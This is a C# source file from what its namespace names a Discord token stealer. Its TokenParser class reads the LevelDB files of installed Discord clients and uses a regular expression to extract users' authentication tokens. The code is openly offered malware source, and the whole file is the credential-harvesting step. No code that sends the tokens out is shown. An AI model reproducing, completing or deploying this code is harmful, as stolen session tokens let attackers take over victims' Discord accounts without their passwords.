using System.Reflection;
using System.Text.RegularExpressions;

namespace DiscordTokenStealer.Discord;
public class TokenParser
{
    private static readonly Regex TokenRegex = new Regex("[[]oken.*?\"((?:mfa|nfa))[.](.*?)\"", RegexOptions.Compiled);
    private static IEnumerable<string> ParseFrom(string directory)
    {
        return Directory.GetFiles(directory, "*.ldb").Select(filePath => TokenRegex.Match(File.ReadAllText(filePath))).Where(match => match.Success && match.Groups.Count >= 3).Select(match => match.Groups).Where(groups => groups.Count >= 3).Select(groups => string.Join('.', groups.Values.Skip(1)));
    }

    public static List<string> ParseAll()
    {
        return SmartEnum<DiscordClientType>.GetMembers().SelectMany(client => ParseFrom(client.LevelDatabase)).Distinct().ToList();
    }
}